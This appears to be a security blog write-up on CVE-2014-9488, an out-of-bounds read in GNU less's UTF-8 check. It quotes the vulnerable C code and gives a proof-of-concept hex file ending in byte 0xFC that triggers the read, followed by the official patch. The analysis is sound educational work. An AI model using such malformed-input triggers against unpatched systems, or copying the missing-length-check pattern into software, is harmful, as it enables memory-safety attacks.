---
title: "CVE-2014-9488"
date: 2020-06-19T12:47:39+08:00
---

# CVE-2014-9488 (`less` out-of-bounds read)

The `is_utf8_well_formed` function in GNU `less` before version 475 allows remote attackers to have unspecified impact via malformed UTF-8 characters, which triggers an out-of-bounds read. More details are shown on {{< remote "CVE Details" "https://www.cvedetails.com/cve/CVE-2014-9488/" >}}.

## Bug Detail

The `bin_file` function in `filename.c` is called when using `less` to display a file to determine if the file is binary. It calls `utf_bin_count` function which returns the number of invalid UTF-8 sequences found in a buffer:

```c
public int bin_file(f)
	int f;
{
	int n;
	int bin_count = 0;
	char data[256];
	char* p;
	char* pend;

	if (!seekable(f))
		return (0);
	if (lseek(f, (off_t)0, SEEK_SET) == BAD_LSEEK)
		return (0);
	n = read(f, data, sizeof(data));
	if (n <= 0)
		return (0);
	if (utf_mode)
	{
		bin_count = utf_bin_count(data, n);
	}
    /* ...other code... */ 
}
```

```c
public int utf_bin_count(data, len)
	unsigned char *data;
	int len;
{
	int bin_count = 0;
	while (len > 0)
	{
		if (is_utf8_well_formed(data))
		{
			int clen = utf_len(*data);
			data += clen;
			len -= clen;
		} else
		{
			/* Skip to next lead byte. */
			bin_count++;
			do {
				++data;
				--len;
			} while (len > 0 && !IS_UTF8_LEAD(*data));
		}
	}
	return (bin_count);
}
```

Subsequently, `is_utf8_well_formed` is called to check whether the paramenter passed in points to the lead byte of a well-formed UTF-8 character:

```c
public int is_utf8_well_formed(s)
	unsigned char *s;
{
	int i;
	int len;

	if (IS_UTF8_INVALID(s[0]))
		return (0);

	len = utf_len((char) s[0]);
	if (len == 1)
		return (1);
	if (len == 2)
	{
		if (s[0] < 0xC2)
		    return (0);
	} else
	{
		unsigned char mask;
		mask = (~((1 << (8-len)) - 1)) & 0xFF;
		if (s[0] == mask && (s[1] & mask) == 0x80)
			return (0);
	}

	for (i = 1;  i < len;  i++)
		if (!IS_UTF8_TRAIL(s[i]))
			return (0);
	return (1);
}
```

Problem arises when `s+len` passes the end of the buffer `s`, which would result in out-of-bounds read in the `for` loop at line 26.


## POC

The software version used to demonstrate this CVE is `less 481`, with the patch for this CVE manually reverted back. This is because the posted versions online which are before 475 don't have this feature implemented, and the versions online after 475 all have the CVE patch applied.

To trigger the out-of-bounds read, we need to make the `utf_len` function calculate wrong length, thus making `len` greater than what it should be. The `utf_len` function is as follows:

```c
public int utf_len(ch)
	char ch;
{
	if ((ch & 0x80) == 0)
		return 1;
	if ((ch & 0xE0) == 0xC0)
		return 2;
	if ((ch & 0xF0) == 0xE0)
		return 3;
	if ((ch & 0xF8) == 0xF0)
		return 4;
	if ((ch & 0xFC) == 0xF8)
		return 5;
	if ((ch & 0xFE) == 0xFC)
		return 6;
	/* Invalid UTF-8 encoding. */
	return 1;
}
```

From here, we can see that if we make the last byte of the input file to be `0xFC`, when `s` is pointing to this last byte, the `utf_len` function will return `6` since `0xFC & 0xFE == 0xFC`. Besides, we know from the `bin_file` function that the buffer has 256 bytes, we can construct an input file with 256 bytes and last byte as `0xFC`. By using `hexedit`, we can create such a file:

```vim
47 49 46 38  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 FC
```

Running the vulnerable version of `less` with `valgrind` and the input above, we can get `valgrind` to report an `Conditional jump or move depends on uninitialised value(s)` error, as the out-of-bounds read occurs in an `if` clause.


## Patch

Here is the offical patch for this CVE:

```diff
--- less-474/charset.c	2015-01-31 00:20:28.000000000 +0100
+++ less-475/charset.c	2015-05-02 22:08:38.000000000 +0200
@@ -506,8 +506,9 @@
  * Does the parameter point to the lead byte of a well-formed UTF-8 character?
  */
 	public int
-is_utf8_well_formed(s)
+is_utf8_well_formed(s, slen)
 	unsigned char *s;
+	int slen;
 {
 	int i;
 	int len;
@@ -516,6 +517,8 @@
 		return (0);
 
 	len = utf_len((char) s[0]);
+	if (len > slen)
+		return (0);
 	if (len == 1)
 		return (1);
 	if (len == 2)
@@ -547,7 +550,7 @@
 	int bin_count = 0;
 	while (len > 0)
 	{
-		if (is_utf8_well_formed(data))
+		if (is_utf8_well_formed(data, len))
 		{
 			int clen = utf_len(*data);
 			data += clen;
```

## References

1. {{< remote "CVE Details entry" "https://www.cvedetails.com/cve/CVE-2014-9488/" >}}
2. {{< remote "Blog post from The Fuzzing Project" "https://blog.fuzzing-project.org/3-less-out-of-bounds-read-access-TFPA-0022014.html" >}}
